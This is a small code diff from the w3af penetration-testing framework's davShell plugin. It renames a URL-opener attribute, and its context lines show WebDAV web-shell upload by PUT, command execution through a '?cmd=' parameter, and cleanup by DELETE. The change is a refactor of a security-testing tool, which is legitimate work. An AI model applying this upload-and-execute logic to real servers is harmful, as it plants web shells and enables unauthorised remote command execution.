@@ -94,7 +94,7 @@ class davShell(baseAttackPlugin):
         if self._verifyVuln( vuln_obj ):
             # Create the shell object
             shell_obj = davShellObj( vuln_obj )
-            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setUrlOpener( self._uri_opener )
             shell_obj.setExploitURL( self._exploit_url )
             return shell_obj
         else:
@@ -122,14 +122,14 @@ class davShell(baseAttackPlugin):
             url_to_upload = vuln_obj.getURL().urlJoin( filename + '.' + extension )
             
             om.out.debug('Uploading file: ' + url_to_upload )
-            self._urlOpener.PUT( url_to_upload, data=file_content )
+            self._uri_opener.PUT( url_to_upload, data=file_content )
             
             # Verify if I can execute commands
             # All w3af shells, when invoked with a blank command, return a 
             # specific value in the response:
             # shell_handler.SHELL_IDENTIFIER
             exploit_url = url_object( url_to_upload + '?cmd=' )
-            response = self._urlOpener.GET( exploit_url )
+            response = self._uri_opener.GET( exploit_url )
             
             if shell_handler.SHELL_IDENTIFIER in response.getBody():
                 msg = 'The uploaded shell returned the SHELL_IDENTIFIER: "'
@@ -208,14 +208,14 @@ class davShellObj(exec_shell):
         '''
         to_send = self.getExploitURL() + urllib.quote_plus( command )
         to_send = url_object( to_send )
-        response = self._urlOpener.GET( to_send )
+        response = self._uri_opener.GET( to_send )
         return response.getBody()
     
     def end( self ):
         om.out.debug('davShellObj is going to delete the webshell that was uploaded before.')
         url_to_del = self._exploit_url.uri2url()
         try:
-            self._urlOpener.DELETE( url_to_del )
+            self._uri_opener.DELETE( url_to_del )
         except w3afException, e:
             om.out.error('davShellObj cleanup failed with exception: ' + str(e) )
         else:
